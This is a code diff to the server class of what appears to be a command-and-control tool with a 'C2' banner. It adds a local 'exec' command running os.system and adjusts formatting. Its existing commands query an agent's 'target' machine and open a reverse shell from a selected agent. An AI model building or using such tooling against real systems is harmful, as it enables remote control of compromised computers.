@@ -15,12 +15,12 @@ class Server:
         self.stop_event = threading.Event() # Test to stop threads
         self.current_agent = Agent(['',''],'',0) # Dummy agent for initialisation
         self.banner = """
-                        ███████╗████████╗██████╗ ██╗   ██╗███████╗███████╗     ██████╗██████╗ 
-                        ██╔════╝╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔════╝    ██╔════╝╚════██╗
-                        ███████╗   ██║   ██████╔╝ ╚████╔╝ █████╗  █████╗      ██║      █████╔╝
-                        ╚════██║   ██║   ██╔══██╗  ╚██╔╝  ██╔══╝  ██╔══╝      ██║     ██╔═══╝ 
-                        ███████║   ██║   ██║  ██║   ██║   ██║     ███████╗    ╚██████╗███████╗
-                        ╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝     ╚═════╝╚══════╝
+                ███████╗████████╗██████╗ ██╗   ██╗███████╗███████╗     ██████╗██████╗ 
+                ██╔════╝╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔════╝    ██╔════╝╚════██╗
+                ███████╗   ██║   ██████╔╝ ╚████╔╝ █████╗  █████╗      ██║      █████╔╝
+                ╚════██║   ██║   ██╔══██╗  ╚██╔╝  ██╔══╝  ██╔══╝      ██║     ██╔═══╝ 
+                ███████║   ██║   ██║  ██║   ██║   ██║     ███████╗    ╚██████╗███████╗
+                ╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝     ╚═════╝╚══════╝
 """
 
         self.commands = {
@@ -47,6 +47,10 @@ class Server:
             'help': {
                 'function': self.help,
                 'description': 'Show this help message'
+            },
+            'exec': {
+                'function': self.exec,
+                'description': 'Execute a system command in local'
             }
         }
 
@@ -67,7 +71,7 @@ class Server:
                 'function': self.ipconfig,
                 'description': 'Retrieve the IP Configuration from the current target '
             },
-                        'shell': {
+            'shell': {
                 'function': self.shell,
                 'description': 'Open a reverse shell from the selected agent (type exit to quit the shell)'
             },
@@ -322,7 +326,7 @@ class Server:
     def ipconfig(self, args):
         self.current_agent.sock.sendall("ipconfig".encode())
         data = self.current_agent.sock.recv(16384)
-        print(data.decode('utf-8'))
+        print("\n" + data.decode('utf-8'))
     
     def search(self,args):
         args = list(filter(lambda x: x != "", args.split(" ")))
@@ -337,3 +341,6 @@ class Server:
                 break
             print('---')
             print(decoded_data)
+
+    def exec(self, args):
+        os.system(args)
